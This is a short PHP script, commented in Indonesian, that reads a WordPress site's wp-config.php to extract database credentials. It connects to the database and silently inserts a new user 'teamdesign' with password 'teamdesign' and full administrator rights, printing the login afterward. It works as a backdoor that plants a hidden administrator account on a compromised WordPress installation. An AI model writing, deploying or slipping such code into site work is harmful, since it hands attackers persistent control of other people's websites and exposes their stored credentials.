<?php
// Set error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Cek file wp-config ada atau tidak
if (!file_exists('wp-config.php')) {
    die("File wp-config.php tidak ditemukan!");
}

// Baca file
$wp_config = file_get_contents('wp-config.php');

// Ambil konfigurasi database
preg_match("/define\(\s*'DB_NAME',\s*'(.*?)'\s*\)/", $wp_config, $db_name);
preg_match("/define\(\s*'DB_USER',\s*'(.*?)'\s*\)/", $wp_config, $db_user);
preg_match("/define\(\s*'DB_PASSWORD',\s*'(.*?)'\s*\)/", $wp_config, $db_pass);
preg_match("/define\(\s*'DB_HOST',\s*'(.*?)'\s*\)/", $wp_config, $db_host);
preg_match("/\\$table_prefix\s*=\s*'(.*?)'/", $wp_config, $table_prefix);

// Koneksi database
$conn = mysqli_connect($db_host[1], $db_user[1], $db_pass[1], $db_name[1]);

if (!$conn) {
    die("Koneksi gagal: " . mysqli_connect_error());
}

$prefix = $table_prefix[1];

// Hapus user lama
mysqli_query($conn, "DELETE FROM {$prefix}users WHERE user_login='teamdesign'");

// Insert user baru
$password_hash = password_hash('teamdesign', PASSWORD_DEFAULT);
$query = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_registered) 
          VALUES ('teamdesign', '{$password_hash}', 'teamdesign@teamdesign.com', NOW())";
          
if (mysqli_query($conn, $query)) {
    $user_id = mysqli_insert_id($conn);
    
    // Set sebagai admin
    mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
                        VALUES ({$user_id}, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
    mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
                        VALUES ({$user_id}, '{$prefix}user_level', '10')");
    
    echo "BERHASIL! Login dengan:<br>";
    echo "User: teamdesign<br>";
    echo "Pass: teamdesign";
} else {
    echo "Error: " . mysqli_error($conn);
}

mysqli_close($conn);
?>
